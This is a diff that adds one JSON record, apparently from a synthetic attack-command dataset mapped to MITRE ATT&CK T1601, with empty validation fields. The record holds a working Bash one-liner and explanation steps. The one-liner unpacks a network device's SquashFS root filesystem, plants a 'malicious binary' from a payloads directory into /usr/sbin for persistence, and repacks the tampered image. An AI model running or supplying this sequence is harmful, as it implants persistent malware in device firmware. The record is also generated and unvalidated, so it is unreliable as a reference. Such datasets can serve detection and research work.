@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "unsquashfs -d /tmp/fw.orig /bootflash/prod_rootfs.squashfs && cp -a /tmp/fw.orig /tmp/fw.mod && install -m 0755 /opt/payloads/netmon /tmp/fw.mod/usr/sbin/netmon && diff -ruN /tmp/fw.orig /tmp/fw.mod && mksquashfs /tmp/fw.mod /var/tmp/modified_rootfs.squashfs -noappend",
+  "explanation": "Unpacks a SquashFS root filesystem from the device image, inserts a payload binary, diffs original vs modified trees, then repacks the tampered rootfs.",
+  "rationale_steps": [
+    "Extract the original root filesystem from the system image for offline modification.",
+    "Insert a malicious binary to achieve persistence within the image.",
+    "Run diff on directory trees to validate the tampering prior to repackaging."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-6048333d-92c5de46",
+  "source_prompt_hash": "6048333d",
+  "timestamp_utc": "2025-09-30T04:32:34.003779Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
